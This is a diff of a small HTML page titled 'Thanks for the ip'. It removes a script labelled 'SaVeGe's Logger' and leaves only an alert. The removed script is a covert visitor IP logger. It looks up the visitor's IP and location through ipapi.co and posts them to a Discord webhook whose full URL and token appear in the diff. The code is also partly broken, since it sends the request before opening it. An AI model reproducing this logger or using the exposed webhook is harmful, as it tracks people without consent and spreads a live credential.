@@ -6,27 +6,7 @@
 <h2>Thanks for the ip</h1>
 
 <script>
-const webhook = {
-url: "https://discord.com/api/webhooks/1034132911743586394/klI24qFWDeohtdnP6-HpZqf_Twz4SdFdeDWhD902lnGhg-rfJQqMCDhwE01Jjr2GnCOY",
-name: "SaVeGe's Logger"
-};
-
-$.getJSON('https://ipapi.co/json', function sendData(data) {
-      const request = new XMLHttpRequest();
-      var rekt = request.send(JSON.stringify(params));
-      request.open("POST", webhook.url);
-      request.setRequestHeader('Content-type', 'application/json');
-      alert("Works?");
-      alert(JSON.stringify(data, null, 2));
-      alert(data, null, 2);
-      alert(rekt);
-      const params = {
-        username: webhook.name,
-        avatar_url: "https://cdn3.iconfinder.com/data/icons/business-marketing-color/48/Spy-512.png",
-        content: "```==== IP INFO ====``` `" + JSON.stringify(data, null, 2) + "`"
-      }
-      request.send(JSON.stringify(params));
-});
+alert("Works?");
 </script> 
 
 </body>
